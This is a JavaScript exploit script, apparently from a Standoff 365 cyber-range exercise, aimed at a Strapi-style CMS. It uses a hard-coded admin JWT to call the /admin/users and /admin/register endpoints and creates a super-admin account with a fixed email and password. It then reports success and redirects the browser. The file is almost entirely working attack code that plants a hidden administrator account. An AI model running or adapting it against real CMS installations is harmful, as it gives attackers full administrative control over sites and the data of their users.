function runExploit(HOST) {
    var cmsToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNjc3MzU4MjA5LCJleHAiOjE2Nzk5NTAyMDl9.2SygRNHVHVwHMWUfU8CNrHtLw5U5do3HsQq9cECoZ5E';

    var email = "SUPERADMIN_zero_0x00@standoff365.com";
    var password = 'As#12$DS!A3';
    var firstname = 'SUPER_ADMIN';
    var lastname = firstname;
    var ROLE_SUPER_ADMIN = 1;

    var createInviteRes;

    fetch("http://" + HOST + "/admin/users", {
        "headers": {
            "authorization": "Bearer " + cmsToken,
            "content-type": "application/json",
        },

        "body": JSON.stringify({
            "firstname": firstname,
            "lastname": lastname,
            "email": email,
            "roles": [ROLE_SUPER_ADMIN]
        }),
        "method": "POST",
        "mode": "cors",
        "credentials": "include"
    }).then(function(res) {
        if (!res.ok) {
            throw new Error('Not 200');
        }
        return res.json();
    }, function(err) {
        document.write(HOST + " register user failed");
        throw new Error(err);
    })
        .then(function(createInviteRes) {
            var registrationToken = createInviteRes.data.registrationToken;

            return fetch("http://" + HOST + "/admin/register", {
                "headers": {
                    "authorization": "Bearer " + cmsToken,
                    "content-type": "application/json",
                },
                "body": JSON.stringify({
                    "userInfo": {
                        "firstname": firstname,
                        "lastname": lastname,
                        "password": password
                    },
                    "registrationToken": registrationToken
                }),
                "method": "POST",
                "mode": "cors",
                "credentials": "include"
            }).then(function(res) {
                if (!res.ok) {
                    throw new Error('Not 200');
                }
                return res.json()
            }, function(err) {
                document.write(HOST + " confirm create user failed");
                throw new Error(err);
            });
        }).then(function() {
        document.write("Exploit successfully completed");
        setTimeout(() => {
            window.location.href = "https://standoff365.com/"
        }, 500);
    });


}
runExploit('localhost:1337');
//runExploit('strapi-app:1337');

setTimeout(() => {
    window.location.href = "https://standoff365.com/"
}, 3000);